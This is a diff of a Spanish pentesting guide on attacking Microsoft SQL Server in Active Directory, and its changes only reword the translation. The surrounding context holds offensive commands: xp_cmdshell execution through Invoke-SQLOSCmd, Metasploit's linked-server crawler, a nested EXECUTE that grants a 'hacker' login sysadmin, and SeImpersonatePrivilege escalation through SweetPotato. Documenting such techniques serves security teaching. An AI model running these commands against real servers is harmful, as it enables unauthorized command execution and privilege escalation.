@@ -148,7 +148,7 @@ También podría ser posible **ejecutar comandos** dentro del host de MSSQL.
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Revisa en la página mencionada en la **siguiente sección cómo hacerlo manualmente.**
+Consulta en la página mencionada en la **siguiente sección cómo hacer esto manualmente.**
 
 ### Trucos Básicos de Hacking en MSSQL
 
@@ -196,7 +196,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Puedes verificar fácilmente los enlaces de confianza usando metasploit.
+Puedes verificar fácilmente los enlaces de confianza utilizando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -221,7 +221,7 @@ EXEC sp_linkedservers;
 ```
 ![](<../../images/image (716).png>)
 
-#### Ejecutar consultas en un enlace confiable
+#### Ejecutar consultas en enlace confiable
 
 Ejecutar consultas a través del enlace (ejemplo: encontrar más enlaces en la nueva instancia accesible):
 ```sql
@@ -254,7 +254,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 El **usuario local de MSSQL** generalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "imite a un cliente después de la autenticación".
 
-Una estrategia que muchos autores han propuesto es forzar a un servicio del SISTEMA a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SISTEMA mientras intenta autenticarse.
+Una estrategia que muchos autores han propuesto es forzar a un servicio del SYSTEM a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SYSTEM mientras intenta autenticarse.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) tiene una colección de estas diversas técnicas que se pueden ejecutar a través del comando `execute-assembly` de Beacon.
 
